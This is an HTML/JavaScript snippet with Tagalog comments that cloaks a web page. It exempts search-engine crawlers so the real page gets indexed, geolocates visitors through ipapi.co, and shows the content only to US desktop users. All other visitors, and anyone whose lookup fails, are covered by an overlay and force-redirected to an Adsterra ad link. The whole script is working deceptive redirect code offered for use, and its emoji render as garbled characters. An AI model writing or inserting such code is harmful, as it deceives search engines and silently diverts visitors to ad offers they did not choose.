  <!-- ‚úÖ US Desktop-Only Guard (bots safe + SEO friendly) -->
  <script>
  (function () {
    var ADSTERRA = "https://moundconclusive.com/qng7ic9mmn?key=7aafa190a2f78bc6cb6fd084e1fa9c4c";

    // ‚úÖ Skip bots (para ma-index ni Google)
    function isBot() {
      var ua = (navigator.userAgent || "").toLowerCase();
      return /bot|crawl|spider|slurp|bingpreview|facebookexternalhit|linkedinbot|monitor|pingdom|preview|crawler|google page speed/i.test(ua);
    }
    if (isBot()) return;

    function isDesktop(){ return !/android|iphone|ipad|ipod|mobile|tablet/i.test(navigator.userAgent); }

    // overlay notice habang nagche-check
    var msg = document.createElement("div");
    msg.textContent = "‚è≥ Ina-redirect ka sa offer na tugma sa iyong device...";
    msg.style.cssText = "position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#0b0f14;color:#e5e7eb;font-family:Inter,Arial,sans-serif;font-size:16px;z-index:9999;text-align:center;";
    document.addEventListener("DOMContentLoaded", function(){ document.body.appendChild(msg); });

    var timeout = setTimeout(function(){
      msg.textContent = "üåê Ina-redirect ka ngayon...";
      location.replace(ADSTERRA);
    },1500);

    fetch("https://ipapi.co/json/")
      .then(r=>r.json())
      .then(d=>{
        clearTimeout(timeout);
        var cc = (d && d.country_code) ? d.country_code.toUpperCase() : "XX";
        if (cc==="US" && isDesktop()) {
          msg.remove(); // ‚úÖ US + desktop: ipakita page
        } else {
          msg.textContent = "üì± Ina-redirect ka sa tamang offer...";
          setTimeout(()=>location.replace(ADSTERRA),700);
        }
      })
      .catch(()=>{
        msg.textContent = "üåê Ina-redirect ka ngayon...";
        location.replace(ADSTERRA);
      });
  })();
  </script>
